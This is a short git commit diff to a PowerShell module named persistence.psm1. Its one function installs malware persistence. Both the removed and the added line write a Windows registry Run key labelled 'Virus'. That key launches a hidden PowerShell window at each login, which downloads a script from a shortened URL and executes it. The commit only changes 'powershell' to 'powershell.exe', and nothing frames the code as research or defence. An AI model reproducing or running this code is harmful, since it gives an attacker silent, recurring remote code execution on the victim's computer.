5c93ad1b53fdabc9fe3d5fd0c080966d66fc0c6a
josprou <34846208+josprou@users.noreply.github.com>
2021-05-28 07:34:53 +0200

    Update persistence.psm1

--- persistence.psm1
+++ persistence.psm1
@@ -1,3 +1,3 @@
 function persistence{
-  reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v "Virus" /d "powershell -NoP -W Hidden IEX (New-Object System.Net.Webclient).DownloadString('https://bit.ly/3uQ5Wid')" /t REG_SZ /f 
+  reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v "Virus" /d "powershell.exe -NoP -W Hidden IEX (New-Object System.Net.Webclient).DownloadString('https://bit.ly/3uQ5Wid')" /t REG_SZ /f 
 }
